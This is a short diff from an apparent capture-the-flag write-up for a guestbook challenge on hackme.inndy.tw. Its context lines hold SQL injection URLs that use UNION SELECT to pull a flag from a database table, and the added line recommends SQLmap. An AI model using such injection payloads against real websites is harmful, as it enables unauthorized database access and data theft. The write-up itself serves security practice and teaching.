@@ -26,6 +26,7 @@ https://hackme.inndy.tw/gb/?mod=read&id=-1 UNION SELECT 1,flag,3,4 FROM g8.flag 
 https://hackme.inndy.tw/gb/?mod=read&id=-1 UNION SELECT 1,flag,3,4 FROM g8.flag limit 1,2 -- - (The correct one)
 ```
 
+Oh,BTW. It's more efficient by using `SQLmap`. 
 
 
 
